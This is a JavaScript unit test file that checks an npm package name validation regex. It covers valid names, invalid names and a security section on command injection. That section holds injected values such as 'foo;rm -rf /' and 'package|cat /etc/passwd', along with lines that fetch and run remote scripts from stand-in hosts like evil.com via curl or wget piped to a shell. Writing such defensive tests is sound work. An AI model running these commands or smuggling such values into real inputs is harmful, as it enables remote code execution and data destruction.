import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { NPM_PACKAGE_NAME_REGEX } from '@astrojs/internal-helpers/cli';

describe('NPM Package Name Validation', () => {
	describe('Valid package names', () => {
		it('accepts simple lowercase names', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('react'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('vue'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('svelte'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('solid'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('preact'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('alpinejs'));
		});

		it('accepts names with hyphens', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('my-package'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('some-cool-integration'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('astro-integration'));
		});

		it('accepts names with underscores', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('my_package'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('some_integration'));
		});

		it('accepts names with dots', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('my.package'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('package.js'));
		});

		it('accepts names with mixed valid characters', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('my-package.js'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('some_cool-package.js'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('integration-2.0'));
		});

		it('accepts names with numbers', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('package2'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('3d-viewer'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('v8'));
		});

		it('accepts scoped packages', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@astrojs/tailwind'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@astrojs/react'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@myorg/my-package'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@company/integration'));
		});

		it('accepts scoped packages with complex names', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@org/my-package.js'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@org/package_with_underscores'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@org/package-2.0'));
		});

		it('accepts packages with tilde', () => {
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('~package'));
			assert.ok(NPM_PACKAGE_NAME_REGEX.test('@org/~package'));
		});
	});

	describe('Invalid package names', () => {
		it('rejects names with spaces', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('my package'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('foo bar'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react '));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test(' react'));
		});

		it('rejects names with uppercase letters', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('React'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('MyPackage'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('PACKAGE'));
		});

		it('rejects empty strings', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test(''));
		});

		it('rejects names starting with dots', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('.package'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('..package'));
		});

		it('rejects names starting with underscores', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('_package'));
		});
	});

	describe('Security: Command injection attempts', () => {
		it('blocks semicolon command injection', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react;whoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package;ls'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('foo;rm -rf /'));
		});

		it('blocks command substitution with $()', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react$(whoami)'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('$(ls)'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package$(id)'));
		});

		it('blocks command substitution with backticks', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react`whoami`'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('`ls`'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package`id`'));
		});

		it('blocks pipe operators', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react|whoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package|cat /etc/passwd'));
		});

		it('blocks ampersand operators', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react&&whoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react&whoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package||ls'));
		});

		it('blocks redirect operators', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react>file'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package>>file'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package<file'));
		});

		it('blocks newlines and special characters', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react\nwhoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package\r\nls'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package\twhoami'));
		});

		it('blocks quotes and escapes', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test("react'whoami'"));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react"whoami"'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react\\whoami'));
		});

		it('blocks parentheses without $', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react(whoami)'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package()'));
		});

		it('blocks curly braces', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react{whoami}'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('{package}'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('{ whoami }'));
		});

		it('blocks asterisks and wildcards', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react*'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('*package'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package?'));
		});

		it('blocks square brackets', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react[whoami]'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('[package]'));
		});

		it('blocks hash/comment characters', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react#whoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('#package'));
		});

		it('blocks dollar signs not in command substitution', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react$var'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('$package'));
		});

		it('blocks exclamation marks', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react!'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('!whoami'));
		});

		it('blocks equals signs', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react=1.0'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package=value'));
		});

		it('blocks percent signs', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react%whoami'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('%package'));
		});

		it('blocks plus signs (except at start)', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react+plus'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package+'));
		});

		it('blocks complex injection attempts', () => {
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('react && curl evil.com | sh'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('package; wget malware; chmod +x malware; ./malware'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('`curl http://evil.com/script.sh | bash`'));
			assert.ok(!NPM_PACKAGE_NAME_REGEX.test('$(curl -s http://malicious.com/payload.sh|bash)'));
		});
	});
});
